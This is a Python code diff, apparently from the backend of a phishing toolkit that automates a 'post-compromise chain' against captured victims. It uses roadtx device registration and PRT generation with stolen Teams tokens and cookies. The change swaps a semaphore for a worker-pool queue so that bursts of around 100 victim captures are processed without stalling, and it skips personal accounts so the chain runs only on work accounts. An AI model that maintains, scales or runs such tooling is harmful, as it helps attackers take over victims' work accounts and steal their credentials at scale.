@@ -8,6 +8,7 @@ import logging
 import threading
 import shutil
 import sys
+import queue
 import db
 from config import Config
 
@@ -201,11 +202,55 @@ def _finalize_and_alert(user_code, teams_token, prt_cookie):
 ACTIVE_CHAINS = set()
 _CHAIN_LOCK = threading.Lock()
 
-# Global cap on simultaneous roadtx chains. Each chain is a subprocess tree
-# (device registration, PRT, DRS) and unbounded fan-out starves the box, so a
-# burst of captures queues here rather than all launching at once.
-_CHAIN_SLOTS = threading.BoundedSemaphore(int(getattr(Config, 'CHAIN_CONCURRENCY', 20)))
-_CHAIN_QUEUE_TIMEOUT = int(getattr(Config, 'CHAIN_QUEUE_TIMEOUT', 600))
+# ── Chain worker pool ────────────────────────────────────────────────────
+# Each chain is a subprocess tree (device registration, PRT, DRS). The box has
+# one core and throughput plateaus at ~20 concurrent chains, so work is queued
+# and drained by a fixed pool of workers.
+#
+# Previously the semaphore was acquired *inside* execute_post_compromise, which
+# runs on a poller thread — so a 100-capture burst blocked 80 poller threads
+# waiting for slots. Now the poller hands off to this queue and returns at once.
+_CHAIN_QUEUE = queue.Queue()
+_CHAIN_WORKERS = []
+_WORKERS_LOCK = threading.Lock()
+CHAIN_CONCURRENCY = int(getattr(Config, 'CHAIN_CONCURRENCY', 20))
+
+
+def _chain_worker():
+    """Drain the chain queue forever. One thread per allowed concurrent chain."""
+    while True:
+        user_code = _CHAIN_QUEUE.get()
+        try:
+            if user_code is None:          # shutdown sentinel
+                return
+            _run_post_compromise_chain(user_code)
+        except Exception as e:
+            logger.error(f"[EXECUTOR] Chain worker error for {user_code}: {e}")
+        finally:
+            if user_code is not None:
+                ACTIVE_CHAINS.discard(user_code)
+                _CHAIN_QUEUE.task_done()
+
+
+def start_chain_workers(count=None):
+    """Start the chain worker pool. Idempotent — safe to call more than once."""
+    global _CHAIN_WORKERS
+    with _WORKERS_LOCK:
+        if _CHAIN_WORKERS:
+            return len(_CHAIN_WORKERS)
+        n = count or CHAIN_CONCURRENCY
+        for i in range(n):
+            t = threading.Thread(target=_chain_worker, daemon=True,
+                                 name=f'chainworker-{i}')
+            t.start()
+            _CHAIN_WORKERS.append(t)
+        logger.info(f"[EXECUTOR] Chain worker pool started ({n} workers).")
+        return n
+
+
+def chain_queue_depth():
+    """Pending chains not yet picked up by a worker."""
+    return _CHAIN_QUEUE.qsize()
 
 
 def is_chain_running(user_code):
@@ -221,35 +266,30 @@ def is_prt_ready(user_code):
 
 
 def execute_post_compromise(user_code):
-    """Run the full automated post-compromise chain for a captured victim.
+    """Queue the post-compromise chain for a captured victim and return
+    immediately.
+
     Duplicate invocations (concurrent poller threads seeing SUCCESS) are
     skipped — two racing chains corrupt each other's device certs and
-    Step 4 PRT generation fails with AADSTS501209."""
+    Step 4 PRT generation fails with AADSTS501209.
+
+    Personal sessions skip the chain entirely, so they are never queued."""
     with _CHAIN_LOCK:
         if user_code in ACTIVE_CHAINS:
             logger.info(f"[EXECUTOR] Chain already running for {user_code} — skipping duplicate.")
             return
         ACTIVE_CHAINS.add(user_code)
 
-    # Wait for a free slot. Personal sessions skip the chain entirely, so this
-    # only ever throttles work captures.
     session = db.get_session_by_user_code(user_code) or {}
-    if (session.get('account_type') or 'work') != 'personal':
-        acquired = _CHAIN_SLOTS.acquire(timeout=_CHAIN_QUEUE_TIMEOUT)
-        if not acquired:
-            logger.warning(f"[EXECUTOR] {user_code}: no chain slot within "
-                           f"{_CHAIN_QUEUE_TIMEOUT}s — running without a slot.")
-        else:
-            logger.info(f"[EXECUTOR] {user_code}: chain slot acquired.")
-    else:
-        acquired = False
-
-    try:
-        _run_post_compromise_chain(user_code)
-    finally:
-        if acquired:
-            _CHAIN_SLOTS.release()
+    if (session.get('account_type') or 'work') == 'personal':
+        # Nothing to do for consumer accounts — release the marker and return.
         ACTIVE_CHAINS.discard(user_code)
+        return
+
+    start_chain_workers()
+    _CHAIN_QUEUE.put(user_code)
+    logger.info(f"[EXECUTOR] {user_code}: queued for chain "
+                f"(depth {_CHAIN_QUEUE.qsize()}).")
 
 
 def _run_post_compromise_chain(user_code):
